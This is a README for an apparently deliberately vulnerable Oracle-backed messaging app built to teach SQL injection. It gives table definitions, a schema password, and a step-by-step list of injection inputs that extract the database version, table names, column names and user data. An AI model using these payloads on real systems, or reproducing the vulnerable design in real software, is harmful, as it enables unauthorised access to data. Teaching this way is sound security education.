[![CircleCI](https://circleci.com/gh/richardjwild/blather/tree/master.svg?style=shield&circle-token=761a13c0a67f184295191d2c4b50c5629645edae)](https://circleci.com/gh/richardjwild/blather/tree/master)

This is a version of the application that connects to an Oracle database. It is intended to illustrate the danger of SQL injection attacks.

The application requires the following tables to be created in a schema called BLATHER (password 'blather'):

```
CREATE TABLE "BLATHER"."MESSAGES" (
"USER_NAME" VARCHAR2(2000 BYTE), 
"TEXT" VARCHAR2(2000 BYTE), 
"timestamp" TIMESTAMP (6))
	
CREATE TABLE "BLATHER"."FOLLOWINGS" (	
"FOLLOWER_NAME" VARCHAR2(2000 BYTE), 
"FOLLOWING_NAME" VARCHAR2(2000 BYTE))

CREATE TABLE "BLATHER"."USERS" (	
"NAME" VARCHAR2(2000 BYTE))
```

The application is vulnerable to the following attacks (not necessarily the only ones) which gradually elicit information about the database, its schema, and the data contained therein:

```
rich -> ') --
rich2 -> ',null) --
rich2 -> ',1) --
rich2 -> ',SYSDATE) --
rich2 -> ' || (SELECT 'foo' FROM DUAL), SYSDATE) --
rich2 -> ' || (SELECT BANNER FROM V$VERSION WHERE ROWNUM=1), SYSDATE) --
rich2 -> ' || (SELECT COUNT (*) FROM USER_TABLES), SYSDATE) --
rich2 -> ' || (SELECT TABLE_NAME FROM (SELECT TABLE_NAME, ROWNUM RN FROM USER_TABLES) WHERE RN = 1), SYSDATE) --
rich2 -> ' || (SELECT COUNT(*) FROM USER_TAB_COLUMNS WHERE TABLE_NAME='USERS'), SYSDATE) --
rich2 -> ' || (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME='USERS' AND ROWNUM=1), SYSDATE) --
rich2 -> ' || (SELECT COUNT(*) FROM USERS), SYSDATE) --
rich2 -> ' || (SELECT NAME FROM (SELECT NAME, ROWNUM RN FROM USERS) WHERE RN=1), SYSDATE) --
```